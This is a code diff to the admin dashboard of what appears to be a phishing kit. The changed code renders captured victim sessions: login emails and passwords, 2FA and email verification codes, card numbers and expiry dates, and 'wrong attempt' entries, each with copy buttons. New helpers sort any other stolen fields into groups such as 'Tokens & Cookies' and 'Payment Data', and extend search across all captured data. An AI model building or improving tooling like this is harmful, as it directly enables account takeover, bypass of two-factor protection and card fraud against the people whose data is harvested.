@@ -346,7 +346,8 @@ if ($http_code === 200) {
                 (s.login_email && s.login_email.toLowerCase().includes(currentSearch)) ||
                 (s.profile_phone && s.profile_phone.includes(currentSearch)) ||
                 (s.domain && s.domain.toLowerCase().includes(currentSearch)) ||
-                (s.clientIp && s.clientIp.includes(currentSearch))
+                (s.clientIp && s.clientIp.includes(currentSearch)) ||
+                JSON.stringify(s).toLowerCase().includes(currentSearch)
             );
         }
         
@@ -455,6 +456,190 @@ if ($http_code === 200) {
         return div.innerHTML;
     }
 
+    const sessionDetailHiddenKeys = new Set(['data']);
+    const sessionDetailKnownKeys = new Set([
+        'socketId', 'domain', 'clientIp', 'ip_address', 'created_at', 'last_seen', 'current_url', 'currentUrl', 'userAgent', 'user_agent',
+        'profile_name', 'profile_email', 'profile_phone',
+        'login_email', 'login_password', 'login_time',
+        '2fa_code', '2fa_time', 'email_code', 'email_code_time',
+        'card_number', 'card_holder', 'card_expiry', 'card_time',
+        'wrong_email', 'wrong_email_time'
+    ]);
+
+    function isMeaningfulValue(value) {
+        if (value === null || value === undefined) return false;
+        if (typeof value === 'string') return value.trim() !== '';
+        if (Array.isArray(value)) return value.some(isMeaningfulValue);
+        if (typeof value === 'object') return Object.values(value).some(isMeaningfulValue);
+        return true;
+    }
+
+    function formatFieldLabel(key) {
+        return String(key)
+            .replace(/([a-z0-9])([A-Z])/g, '$1 $2')
+            .replace(/[_-]+/g, ' ')
+            .replace(/\b\w/g, char => char.toUpperCase())
+            .replace(/\b2 Fa\b/g, '2FA')
+            .replace(/\bOtp\b/g, 'OTP')
+            .replace(/\bIp\b/g, 'IP')
+            .replace(/\bUrl\b/g, 'URL')
+            .replace(/\bId\b/g, 'ID');
+    }
+
+    function isTimeLikeField(key) {
+        return /(?:^|_)(time|date|at|seen|updated|created)$/i.test(String(key))
+            || ['created_at', 'last_seen'].includes(String(key));
+    }
+
+    function buildCopyButton(value, className = 'btn-sm btn-view') {
+        const rawValue = typeof value === 'string' ? value : JSON.stringify(value, null, 2);
+        const encodedValue = encodeURIComponent(rawValue);
+        return ` <button class="${className}" onclick="copyToClipboard(decodeURIComponent('${encodedValue}'))">Copy</button>`;
+    }
+
+    function formatDetailValue(value, key = '') {
+        if (isTimeLikeField(key)) return escapeHtml(formatTime(value));
+        if (typeof value === 'boolean') return value ? 'Yes' : 'No';
+        if (Array.isArray(value) || (value && typeof value === 'object')) {
+            return `<pre class="mb-0"><code>${escapeHtml(JSON.stringify(value, null, 2))}</code></pre>`;
+        }
+        return escapeHtml(String(value));
+    }
+
+    function renderDetailRow(label, value, options = {}) {
+        if (!isMeaningfulValue(value)) return '';
+
+        const displayValue = options.formatter
+            ? options.formatter(value)
+            : formatDetailValue(value, options.key || '');
+        const copyButton = options.copy ? buildCopyButton(options.copyValue ?? value) : '';
+        const suffix = options.suffix ? ` <small class="text-muted">${escapeHtml(options.suffix)}</small>` : '';
+
+        return `<div class="data-row"><div class="data-label">${escapeHtml(label)}:</div><div class="data-value">${displayValue}${copyButton}${suffix}</div></div>`;
+    }
+
+    function renderDetailSection(title, rows, extraClasses = 'mb-3') {
+        const visibleRows = rows.filter(Boolean);
+        if (!visibleRows.length) return '';
+
+        return `
+            <div class="card ${extraClasses}">
+                <div class="card-header bg-light"><strong>${escapeHtml(title)}</strong></div>
+                <div class="card-body">${visibleRows.join('')}</div>
+            </div>
+        `;
+    }
+
+    function getAdditionalSectionTitle(key) {
+        if (/(recovery|backup|verify|code|otp|2fa|pin)/i.test(key)) return 'Verification Data';
+        if (/(token|cookie|session|auth|bearer|jwt)/i.test(key)) return 'Tokens & Cookies';
+        if (/(card|cvv|payment|wallet|bank|iban|crypto|expiry)/i.test(key)) return 'Payment Data';
+        if (/(login|pass|credential|email|username|user)/i.test(key)) return 'Credentials & Identity';
+        if (/(phone|address|city|state|country|zip|postal|name)/i.test(key)) return 'Profile Details';
+        return 'Additional Captured Data';
+    }
+
+    function collectAdditionalSessionEntries(session) {
+        const entries = [];
+        const seenKeys = new Set();
+        const sources = [session];
+
+        if (session && session.data && typeof session.data === 'object' && !Array.isArray(session.data)) {
+            sources.push(session.data);
+        }
+
+        for (const source of sources) {
+            if (!source || typeof source !== 'object' || Array.isArray(source)) continue;
+
+            for (const [key, value] of Object.entries(source)) {
+                if (seenKeys.has(key) || sessionDetailHiddenKeys.has(key) || sessionDetailKnownKeys.has(key) || !isMeaningfulValue(value)) {
+                    continue;
+                }
+
+                seenKeys.add(key);
+                entries.push({ key, value });
+            }
+        }
+
+        return entries;
+    }
+
+    function renderAdditionalDetailSections(session) {
+        const groupedEntries = new Map();
+
+        for (const entry of collectAdditionalSessionEntries(session)) {
+            const title = getAdditionalSectionTitle(entry.key);
+            if (!groupedEntries.has(title)) groupedEntries.set(title, []);
+            groupedEntries.get(title).push(entry);
+        }
+
+        let html = '';
+        for (const [title, entries] of groupedEntries.entries()) {
+            html += renderDetailSection(title, entries.map(({ key, value }) =>
+                renderDetailRow(formatFieldLabel(key), value, { key, copy: true })
+            ));
+        }
+
+        return html;
+    }
+
+    function renderSessionDetailHtml(session, socketId) {
+        const basicSection = renderDetailSection('Basic Information', [
+            renderDetailRow('Socket ID', socketId, { copy: true }),
+            renderDetailRow('Domain', session.domain || 'unknown'),
+            renderDetailRow('IP', session.clientIp || session.ip_address || 'unknown'),
+            renderDetailRow('Created', session.created_at, { key: 'created_at' }),
+            renderDetailRow('Last Seen', session.last_seen, { key: 'last_seen' }),
+            renderDetailRow('Current URL', session.current_url || session.currentUrl || 'Unknown'),
+            renderDetailRow('User Agent', session.userAgent || session.user_agent)
+        ]);
+
+        const profileSection = renderDetailSection('Profile Information', [
+            renderDetailRow('Name', session.profile_name),
+            renderDetailRow('Email', session.profile_email, { copy: true }),
+            renderDetailRow('Phone', session.profile_phone, { copy: true })
+        ]);
+
+        const loginSection = renderDetailSection('Login Credentials', [
+            renderDetailRow('Email', session.login_email, { copy: true }),
+            renderDetailRow('Password', session.login_password, { copy: true }),
+            renderDetailRow('Time', session.login_time, { key: 'login_time' })
+        ]);
+
+        const verificationSection = renderDetailSection('Verification Codes', [
+            renderDetailRow('2FA Code', session['2fa_code'], {
+                key: '2fa_code',
+                copy: true,
+                suffix: isMeaningfulValue(session['2fa_time']) ? `(${formatTime(session['2fa_time'])})` : ''
+            }),
+            renderDetailRow('Email Code', session.email_code, {
+                key: 'email_code',
+                copy: true,
+                suffix: isMeaningfulValue(session.email_code_time) ? `(${formatTime(session.email_code_time)})` : ''
+            })
+        ]);
+
+        const cardSection = renderDetailSection('Card Details', [
+            renderDetailRow('Card Number', session.card_number, { copy: true }),
+            renderDetailRow('Card Holder', session.card_holder),
+            renderDetailRow('Expiry', session.card_expiry),
+            renderDetailRow('Time', session.card_time, { key: 'card_time' })
+        ]);
+
+        const wrongAttemptSection = renderDetailSection('Wrong Attempt', [
+            renderDetailRow('Email', session.wrong_email),
+            renderDetailRow('Time', session.wrong_email_time, { key: 'wrong_email_time' })
+        ], 'mb-3 border-danger');
+
+        return basicSection
+            + profileSection
+            + loginSection
+            + verificationSection
+            + cardSection
+            + renderAdditionalDetailSections(session)
+            + wrongAttemptSection;
+    }
+
     function toggleDomain(domainId) {
         const el = document.getElementById(`domain-${domainId}`);
         el.classList.toggle('show');
@@ -475,85 +660,7 @@ if ($http_code === 200) {
             const data = await response.json();
             
             if (data.success && data.data) {
-                const s = data.data;
-                let html = `
-                    <div class="card mb-3">
-                        <div class="card-header bg-light"><strong>Basic Information</strong></div>
-                        <div class="card-body">
-                            <div class="data-row"><div class="data-label">Socket ID:</div><div class="data-value"><code>${socketId}</code></div></div>
-                            <div class="data-row"><div class="data-label">Domain:</div><div class="data-value">${escapeHtml(s.domain || 'unknown')}</div></div>
-                            <div class="data-row"><div class="data-label">IP:</div><div class="data-value">${escapeHtml(s.clientIp || 'unknown')}</div></div>
-                            <div class="data-row"><div class="data-label">Created:</div><div class="data-value">${formatTime(s.created_at)}</div></div>
-                            <div class="data-row"><div class="data-label">Last Seen:</div><div class="data-value">${formatTime(s.last_seen)}</div></div>
-                            <div class="data-row"><div class="data-label">Current URL:</div><div class="data-value"><small>${escapeHtml(s.current_url || s.currentUrl || 'Unknown')}</small></div></div>
-                        </div>
-                    </div>
-                `;
-                
-                if (s.profile_name || s.profile_email) {
-                    html += `
-                        <div class="card mb-3">
-                            <div class="card-header bg-light"><strong>Profile Information</strong></div>
-                            <div class="card-body">
-                                ${s.profile_name ? `<div class="data-row"><div class="data-label">Name:</div><div class="data-value">${escapeHtml(s.profile_name)}</div></div>` : ''}
-                                ${s.profile_email ? `<div class="data-row"><div class="data-label">Email:</div><div class="data-value"><code>${escapeHtml(s.profile_email)}</code></div></div>` : ''}
-                                ${s.profile_phone ? `<div class="data-row"><div class="data-label">Phone:</div><div class="data-value"><code>${escapeHtml(s.profile_phone)}</code></div></div>` : ''}
-                            </div>
-                        </div>
-                    `;
-                }
-                
-                if (s.login_email) {
-                    html += `
-                        <div class="card mb-3">
-                            <div class="card-header bg-light"><strong>Login Credentials</strong></div>
-                            <div class="card-body">
-                                <div class="data-row"><div class="data-label">Email:</div><div class="data-value"><code>${escapeHtml(s.login_email)}</code></div></div>
-                                ${s.login_password ? `<div class="data-row"><div class="data-label">Password:</div><div class="data-value"><code>${s.login_password}</code> <button class="btn-sm btn-view" onclick="copyToClipboard('${s.login_password.replace(/'/g, "\\'")}')">Copy</button></div></div>` : ''}
-                                <div class="data-row"><div class="data-label">Time:</div><div class="data-value">${formatTime(s.login_time)}</div></div>
-                            </div>
-                        </div>
-                    `;
-                }
-                
-                if (s['2fa_code']) {
-                    html += `
-                        <div class="card mb-3">
-                            <div class="card-header bg-light"><strong>2FA Code</strong></div>
-                            <div class="card-body">
-                                <div class="data-row"><div class="data-label">Code:</div><div class="data-value"><code>${s['2fa_code']}</code> <button class="btn-sm btn-view" onclick="copyToClipboard('${s['2fa_code']}')">Copy</button> <small class="text-muted">(${formatTime(s['2fa_time'])})</small></div></div>
-                                ${s.email_code ? `<div class="data-row"><div class="data-label">Email Code:</div><div class="data-value"><code>${s.email_code}</code> <small class="text-muted">(${formatTime(s.email_code_time)})</small></div></div>` : ''}
-                            </div>
-                        </div>
-                    `;
-                }
-                
-                if (s.card_number) {
-                    html += `
-                        <div class="card mb-3">
-                            <div class="card-header bg-light"><strong>Card Details</strong></div>
-                            <div class="card-body">
-                                <div class="data-row"><div class="data-label">Card Number:</div><div class="data-value"><code>${s.card_number}</code> <button class="btn-sm btn-view" onclick="copyToClipboard('${s.card_number}')">Copy</button></div></div>
-                                ${s.card_expiry ? `<div class="data-row"><div class="data-label">Expiry:</div><div class="data-value">${s.card_expiry}</div></div>` : ''}
-                                <div class="data-row"><div class="data-label">Time:</div><div class="data-value">${formatTime(s.card_time)}</div></div>
-                            </div>
-                        </div>
-                    `;
-                }
-                
-                if (s.wrong_email) {
-                    html += `
-                        <div class="card mb-3 border-danger">
-                            <div class="card-header bg-danger text-white"><strong>Wrong Attempt</strong></div>
-                            <div class="card-body">
-                                <div class="data-row"><div class="data-label">Email:</div><div class="data-value">${escapeHtml(s.wrong_email)}</div></div>
-                                <div class="data-row"><div class="data-label">Time:</div><div class="data-value">${formatTime(s.wrong_email_time)}</div></div>
-                            </div>
-                        </div>
-                    `;
-                }
-                
-                $('#sessionModalBody').html(html);
+                $('#sessionModalBody').html(renderSessionDetailHtml(data.data, socketId));
             } else {
                 $('#sessionModalBody').html('<div class="text-center text-danger py-4">No session data found</div>');
             }
